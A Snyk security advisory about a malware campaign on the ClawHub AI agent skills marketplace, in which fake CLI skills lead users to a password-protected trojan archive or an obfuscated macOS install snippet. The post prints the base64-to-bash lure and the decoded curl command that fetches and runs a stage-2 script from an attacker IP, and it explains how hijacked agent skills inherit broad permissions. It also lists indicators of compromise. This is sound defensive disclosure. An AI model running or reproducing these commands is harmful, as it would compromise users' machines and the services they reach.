@@ -1,0 +1,181 @@
+Inside the 'clawdhub' Malicious Campaign: AI Agent Skills Drop Reverse Shells on OpenClaw Marketplace | Snyk
+
+Skip to main content
+
+Platform
+Resources
+Company
+Pricing
+Select your language ENLoginSign upBook a live demo
+ExploreIntegrationsDeepCode AIEvo Overview Security and governance for AI AgentsEvo Agentic Development Security Secure software in the age of AI agentsEvo AI-SPM Makes AI visible, governable and enforceableEvo Continuous Offensive Security Find what attackers find, before they find itEvo Agentic AppSec Security agents that run your AppSec programSnyk Code Secure your code as it's writtenSnyk Open Source Avoid vulnerable dependenciesSnyk Container Keep your base images secureSnyk IaC Fix IaC misconfigurations in-codeSnyk API & Web (DAST) Find and test APIs and web appsSnyk Secrets Stop hardcoded secrets before commitSecure AI-Generated Code AI writes, Snyk securesApplication Security Build secure, stay secureSoftware Supply Chain Security Mitigate supply chain riskZero-Day Vulns Fix the first day with SnykRisk based prioritization Focus on what mattersResource Library Browse our extensive databaseCustomer Resources The one stop shop for customersSnyk in 30 Resource Hub Live and on-demand sessionsCode Checker Write better code for freeSecurity Intelligence Comprehensive vulnerability dataSnyk BlogSnyk's PodcastsSnyk’s YouTubeAI GlossarySnyk Labs Research on AI, vulnerabilities, and DevSecOpsSnyk Learn Security education from SnykSnyk User Docs Get started with SnykSnyk Support How can we help?Snyk Vuln Database Find new vulnerabilitiesSnyk Updates Stay in the loopSnyk Partner Solutions Directory Explore Snyk Partner IntegrationsAI Security Engineers Join the community to help build secure AIRead moreEvents & WebinarsAmbassadorsVulnVortexSubscribe to our newsletterOur Services Maximize your AppSec ROIOur Customers We help customers save time and moneyOur Partners Bringing business class security with partnersCase Studies Check out our customer stories and statsNewsroom See the latest press releasesContact Us Get in touch with any feedback or questionsCareers Join Snyk todayLeadership Meet our leadersRead more
+
+In this article
+
+The clawdhub1 infection chain
+
+1. Social engineering: The performance lure
+
+2. The windows vector: Password-protected evasion
+
+3. The macOS vector: Obfuscated Glot.io execution
+
+Timeline of discovery
+
+The Snyk perspective: Securing the AI supply chain
+
+How to defend against SKILLS and MCP malware
+
+Remediation and IOCs
+
+Want to try it for yourself?
+Book a live demo
+
+Inside the 'clawdhub' Malicious Campaign: AI Agent Skills Drop Reverse Shells on OpenClaw Marketplace
+Written by 
+
+Liran Tal
+ 0 mins read
+
+On Sunday, February 2nd, Snyk’s security research team uncovered a targeted malware campaign embedded directly within the ClawHub skills marketplace (clawhub.ai), a popular repository for AI agent capabilities.
+The malicious entry, originally published by user zaycv under the name clawhub, masquerades as an official CLI tool for managing agent skills. While the original instance was removed on February 3rd, Snyk researchers have identified a currently active variant named clawdhub1, which has already garnered nearly 100 installations.
+
+This active campaign confirms the urgent warnings Snyk issued earlier this year regarding the security risks of AI personal assistants and the specific danger of "SKILL.md" files serving as attack vectors. If you have interacted with "ClawHub CLI" skills or followed installation instructions from user zaycv in the last 48 hours, assume your host machine is compromised.
+The clawdhub1 infection chain
+The attack relies on a multi-stage delivery mechanism that bypasses ClawHub's (limited) static analysis by keeping the malicious logic entirely external to the SKILL.md file.
+1. Social engineering: The performance lure
+The attacker, zaycv, uses technical jargon to target power users. The skill description promises "advanced caching and compression" and "optimizing performance" for skill publishing. This specific framing targets developers who are likely to be frustrated with standard tool latency, making them more willing to install an "optimization" utility without second-guessing the prerequisites.
+
+2. The windows vector: Password-protected evasion
+For Windows users, the SKILL.md links to a GitHub release hosted by user Ddoy233 (an account created specifically for this campaign).
+
+Repo: https://github.com/Ddoy233/openclawcli
+
+Technique: The archive (openclawcli.zip) is password-protected (password: openclaw).
+
+Why this matters: Encrypting the zip file is a deliberate tradecraft technique used to bypass automated security scanners, email filters, and browser safety checks that attempt to inspect archive contents for malware signatures. Inside, the "CLI" contains a Trojanized executable and DLLs likely functioning as an infostealer.
+
+3. The macOS vector: Obfuscated Glot.io execution
+The macOS instruction directs users to a snippet on glot.io, a code-sharing pastebin. This adds a layer of indirection; the malicious code isn't in the SKILL.md, nor is it a direct file download.
+The Obfuscation Layer: The snippet appears to print a benign "Installer-Package" message but pipes a base64 string into bash:
+
+The download.setup-service.com URL is a decoy string intended to look like a legitimate package source in terminal output to reassure the user.
+
+The base64 -D | bash chain is the actual execution trigger.
+
+1echo "Installer-Package: https://download.setup-service.com/pkg/" && echo '<masked-token>' | base64 -D | bash
+The Payload: Decoded, the command is a direct retrieval of a shell script from a raw IP address:
+
+1/bin/bash -c "$(curl -fsSL http://91.92.242.30/528n21ktxu08pmer)"
+This executes a stage-2 payload from 91.92.242.30, a non-reputable IP address that bypasses domain blocklists.
+Timeline of discovery
+
+Feb 2, 2026: Snyk Staff Research Engineer Luca Beurer-Kellner identifies the original malicious skill clawhub (7,743 downloads) on the marketplace.
+
+Feb 3, 2026: The clawhub skill is removed from the marketplace.
+
+Feb 3, 2026 (Later): Snyk Incubation Engineer Aleksei Kudrinskii discovers the attacker has returned with a renamed variant, clawdhub1, which remains active and operational.
+
+Feb 4, 2026: Snyk releases this advisory.
+The Snyk perspective: Securing the AI supply chain
+This incident highlights a critical blind spot in the modern "AI Stack." We are moving from a world of code dependencies to agent capability dependencies.
+Traditional AppSec tools scan your code and containers. They do not read the English-language instructions in a SKILL.md file, nor do they validate the intent of an AI Agent's "tool use."
+The "Spicy" Risk of Agentic Workflow: as discussed in our Clawdbot analysis, AI agents like OpenClaw are often granted broad permissions, reading emails, accessing filesystems, and executing shell commands, to be useful assistants. When a malicious skill like clawdhub1 is installed, it inherits these permissions. The malware doesn't just compromise the machine; it can potentially compromise every service the AI agent is authorized to access, from GitHub repositories to cloud infrastructure.
+This is where Snyk Evo applies. Snyk’s Evo platform and AI-SPM (AI Security Posture Management) are designed to govern exactly this type of unregulated interaction:
+
+Unmanaged AI Models & Tools: Evo detects when developers or agents introduce unverified external tools (like a random Skill from a marketplace) into the corporate environment.
+
+Supply Chain Visibility: Just as Snyk Advisor rates npm packages, Snyk's AI security research is now focused on rating the reputations of Agent Skills and Model Weights, flagging anomalies such as a "new user" (zaycv) publishing a "critical system tool" with zero community history.
+How to defend against SKILLS and MCP malware
+Snyk provides several ways to secure against AI-native threats:
+
+Tools like mcp-scan (Model Context Protocol Scanner) are the next evolution of defense, ensuring that the instructions given to agents don't lead to system compromise. MCP Scan will detect MCP servers that are intentionally malicious via prompt injection or tool poisoning, and will also detect malicious and risky SKILL.md files.
+
+Tools like Snyk’s AI-BOM (another command you can easily run: snyk aibom) will help you uncover the inventory of AI components in use across your codebase, inclusive of AI models, agents, MCP Servers, datasets, and plugins.
+Remediation and IOCs
+Immediate Actions:
+
+Block Traffic: Block egress to 91.92.242.30 at the firewall level immediately.
+
+Audit Skills: Check your ClawHub account and local agent configurations for any skills named clawhub or clawdhub1 installed by user zaycv.
+
+Run Snyk Checks: Ensure your AI development environments are scanned.
+Indicators of Compromise (IOCs):
+
+Domains/IPs: 91.92.242.30
+
+URLs: https://glot.io/snippets/hfd3x9ueu5, https://github.com/Ddoy233/openclawcli
+
+Usernames: zaycv (ClawHub), Ddoy233 (GitHub)
+
+Package Names: clawhub, clawdhub1
+References:
+
+Snyk Evo - AI Security Posture Management
+
+Snyk Advisor - Supply Chain Intelligence
+
+From SKILL.md to Shell Access in Three Lines of Markdown
+
+Your Clawdbot (OpenClaw) AI Assistant Has Shell Access
+
+GUIDE
+Unifying Control for Agentic AI With Evo By Snyk
+
+Evo by Snyk gives security and engineering leaders a unified, natural-language orchestration for AI security. Discover how Evo coordinates specialized agents to deliver end-to-end protection across your AI lifecycle.
+
+Get the guide
+
+Patched & Dispatched
+Your monthly roundup of Snyk content – the latest insights patched in, dispatched straight to your inbox. No fluff. Just the good stuff.Subscribe to our newsletter
+
+Platform
+Snyk AI Security Platform
+Evo
+Integrations
+DeepCode AI
+
+Our Resources
+Resource Library
+Blog
+Snyk’s Podcasts
+AI Glossary
+llms.txt
+
+Knowledge & Docs
+Snyk Labs
+Snyk Learn
+Snyk User Docs
+Snyk Support
+Snyk Vuln Database
+Snyk Updates
+Snyk Trust Center
+
+Company & Community
+About Snyk
+Contact Us
+Book A Demo
+Careers
+Events & Webinars
+Ambassadors
+
+Why Snyk
+Snyk vs GitHub Advanced Security
+Snyk vs Veracode
+Snyk vs Checkmarx
+Snyk vs Black Duck
+Snyk vs Wiz
+Snyk vs Aikido
+
+Community
+X
+YouTube
+LinkedIn
+GitHub
+npm
+Discord
+
+© 2026 Snyk Limited Registered in England and Wales
+Legal terms
+Privacy Notice
+Terms of use
+California residents: do not sell my information
